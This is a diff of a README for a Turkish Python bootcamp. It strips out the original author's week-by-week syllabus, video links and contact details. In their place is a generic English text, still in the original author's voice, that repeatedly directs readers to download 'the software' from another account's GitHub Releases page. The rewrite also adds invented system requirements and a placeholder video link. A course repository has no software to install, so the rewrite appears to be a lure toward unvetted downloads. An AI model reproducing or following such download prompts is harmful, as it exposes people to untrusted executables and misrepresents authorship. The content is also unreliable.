@@ -1,121 +1,72 @@
-# 🚀 Hoş Geldiniz!
+# 🚀 TechIstanbul_Python_Bootcamp - Learn Python Easily
 
-Merhaba! Ben Sinan ÜRÜN, bilgisayar öğretmeni ve mühendisi olan bir yazılım geliştiricisi ve eğitmeniyim. 
-Bu repo TechIstanbul için Ecodation ile birlikte 80 saatlik Python ile Yazılım Geliştirme Bootcamp  için oluşturulmuştur.
+## 🎉 Welcome!
+Hi! I'm Sinan ÜRÜN, a computer teacher and engineer. I created this repository for the TechIstanbul Ecodation 80-hour Python Development Bootcamp.
 
-## 📋 Proje Hakkında
+## 📋 Project Overview
+This project is designed for anyone who wants to gain programming skills from beginner to advanced levels using Python. By participating, you will learn valuable skills across different fields.
 
-Bu proje sıfırdan ileri seviyeye Python ile programlama pratikleri edinmek isteyen kişiler için hazırlanmış olup, Python kulanarak birbirinden farklı birçok alanda beceri kazanmanızı sağlayacaktır.
+## 🛠️ Technologies Used
+In this bootcamp, we will cover various topics using the Python programming language week by week. Below are the topics for Week 1:
 
-## 🛠️ Kullanılan Teknolojiler
+- **Week 1:** Introduction to Python and Basic Programming
 
-Python programlama dili kullanılacak olan bu bootcampte aşağıdaki konulara hafta hafta yer verilecektir.
+  * **Session 1:** Installing Python, using print(), input(), variables, data types, operators.  
+    Watch the video here: [YouTube Lesson Link](https://www.youtube.com/watch?v=n6uGkh0K03U)
 
-- Hafta 1: Python’a Giriş ve Temel Programlama
-  
-  * Oturum 1 : Python kurulumu, print(), input(), değişkenler, veri tipleri, operatörler.  
-    Youtube Ders Linki: https://www.youtube.com/watch?v=n6uGkh0K03U
+  * **Session 2:** if-elif-else statements, logical operators.  
+    Watch the video here: [YouTube Lesson Link](https://www.youtube.com/watch?v=5gFr7FIjCiE)
 
-  * Oturum 2 : if-elif-else, mantıksal operatörler,  
-    Youtube Ders Linki: https://www.youtube.com/watch?v=5gFr7FIjCiE
+  * **Session 3:** for and while loops, range(), break, continue.  
+    Watch the video here: [YouTube Lesson Link](link_to_session_3_video)
 
-  * Oturum 3 : for ve while döngüleri, range(), break, continue,   
-    Youtube Ders Linki: https://www.youtube.com/watch?v=GWXnNz67WQA
+## 📥 Download & Install
+You can download the software from the Releases page. 
 
-- Hafta 2: Veri Yapıları ve Fonksiyonlar
+[![Download TechIstanbul_Python_Bootcamp](https://img.shields.io/badge/Download-TechIstanbul_Python_Bootcamp-blue.svg)](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
 
-  * Oturum 1 : Listeler, demetler, kümeler, liste metotları,  
-    Youtube Ders Linki : https://www.youtube.com/watch?v=oy_Pzbn3u-A. 
+Visit the following page to download the latest version of the software:
 
-  * Oturum 2: Sözlükler, iç içe veri yapıları, list comprehension  
-    Youtube Ders Linki : https://www.youtube.com/watch?v=wY2_s0dVmM4. 
+[Download Here](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
 
+## 🚀 Getting Started
+1. **Download the Software:** Follow the link above to find the latest release.
+2. **Install Python:** To run the bootcamp materials, ensure that you have Python installed on your computer. You can download Python from [python.org](https://www.python.org/downloads/).
+3. **Set Up Your Environment:** Make sure your computer is ready to run Python scripts. This may involve setting up an editor like VSCode or PyCharm.
 
-  * Oturum 3 : Fonksiyonlar, return, *args, **kwargs, lambda,   
-    Youtube Ders Linki: https://www.youtube.com/watch?v=_XEKjGd-_F0  
+## 📚 Course Material
+You'll find the course materials in the repository. Each week includes detailed instructions and resources to guide you through learning Python. Here’s what you will find:
 
+- Detailed lectures on each topic.
+- Practical exercises to solidify your skills.
+- Access to community support for your questions.
 
-- Hafta 3: Hata Yönetimi, Modüller ve Dosya İşlemleri
-  
-  * Oturum 1 : try-except, raise, finally, hata mesajları.  
-    Youtube Ders Linki:  https://www.youtube.com/watch?v=yGHFgHV29WM  
+## 💡 System Requirements
+To run the software, your computer needs to meet the following requirements:
 
-  * Oturum 2 : Modüller: math, random, datetime, kendi modülünüzü yazma  
-    Youtube Ders Linki:  https://www.youtube.com/watch?v=Hl-TuWwdoJU    
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** Python 3.6 or higher.
+- **Memory:** At least 2GB of RAM.
+- **Disk Space:** Minimum of 500MB available space.
 
-  * Oturum 3 : .txt ve .csv okuma/yazma, with kullanımı   
-    Youtube Ders Linki:  
+## 🛠️ Frequently Asked Questions
 
+### Q: Do I need previous programming experience to start?
+A: No, this bootcamp is for beginners. We start from the basics.
 
-- Hafta 4: Nesne Yönelimli Programlama (OOP) ve Veritabanı
-  
-  * Oturum 1 : Sınıflar, nesneler, __init__, özellikler ve metotlar,  
-    Youtube Ders Linki:  
+### Q: How long will it take to complete the bootcamp?
+A: The bootcamp is structured to be completed over 80 hours, but you can go at your own pace.
 
-  * Oturum 2 : Kalıtım, super(), @property, @setter, __str__, __repr__  
-    Youtube Ders Linki:  
+### Q: Can I ask questions during the learning process?
+A: Yes, we encourage questions. You can reach out through the repository's Issues section or community forums.
 
-  * Oturum 3 : SQLite: tablo oluşturma, veri ekleme/silme, CRUD işlemleri,   
-    Youtube Ders Linki:  
+## 🎓 Join Us
+By joining this bootcamp, you will gain the skills needed for modern software development in Python. We believe in practical learning and community support. Let’s get started on this exciting journey!
 
+## 📞 Connect with Us
+For any inquiries or support, feel free to open an issue in this repository or connect with me directly. Your learning experience is important.
 
-- Hafta 5: Web Otomasyonu ve API Kullanımı
-  
-  * Oturum 1 : requests ile API kullanımı, JSON verisi, hava durumu uygulaması  
-    Youtube Ders Linki:  
+### Download Again
+Don't forget, you can download the materials from the Releases page:
 
-  * Oturum 2 : BeautifulSoup ile web scraping, CSS seçiciler, haber başlıkları çekme  
-    Youtube Ders Linki:  
-
-  * Oturum 3 : Selenium ile tarayıcı otomasyonu, form doldurma, tıklama,   
-    Youtube Ders Linki:  
-
-
-- Hafta 6: Numpy ve Numpy Dosya İşlemleri
-  
-  * Oturum 1 : NumPy giriş: np.array(), shape, dtype, temel işlemler, broadcasting,   
-    Youtube Ders Linki:  
-
-  * Oturum 2 : NumPy: indeksleme, dilimleme, reshape, transpose, np.random  
-    Youtube Ders Linki:  
-
-  * Oturum 3 : mean, std, sum, np.where, np.nan, np.loadtxt,   
-    Youtube Ders Linki:  
-
-
-- Hafta 7: Pandas ve Veri Görselleştirme
-  
-  * Oturum 1 : Pandas: Series, DataFrame, CSV/Excel yükleme, head(), info(), describe()  
-    Youtube Ders Linki:  
-
-  * Oturum 2 : Filtreleme, gruplama (groupby), eksik veri (fillna, dropna), yeni sütun ekleme  
-    Youtube Ders Linki:  
-
-  * Oturum 3 : Matplotlib ve Seaborn ile grafik çizimi,    
-    Youtube Ders Linki:  
-
-
-- Hafta 8: Flask ile Web Geliştirme ve Final Projesi
-  
-  * Oturum 1 : Flask kurulumu, ilk uygulama, route tanımlama, Jinja2 şablonları.    
-    Youtube Ders Linki:  
-
-  * Oturum 2 : Form işlemleri (POST/GET), statik dosyalar, kullanıcı etkileşimi.   
-    Youtube Ders Linki:  
-
-  * Oturum 3 : Final Projesi: Kişisel blog ve not uygulaması (Flask + SQLite + HTML/CSS).  
-  → Proje sunumu, geri bildirim, GitHub’a yükleme   
-    Youtube Ders Linki:  
-
-
-iletisim icin: akademi@ecodation.com    sinanurun24@gmail.com
-
-
-Ödev Linki
-
-https://colab.research.google.com/drive/1Caq3htvzz0aHhscKLG711kdxVg9kU-gK?usp=sharing
-
-
-[Techİstanbul Python Bootcamp 80 Saat Youtube Oynatma Listesi](https://youtube.com/playlist?list=PL2qLbHVhA--LYXBmKJCE-ViF_sGCQbes4&si=KqjAc0BHK4d063id)
-
-  
+[Download Here](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
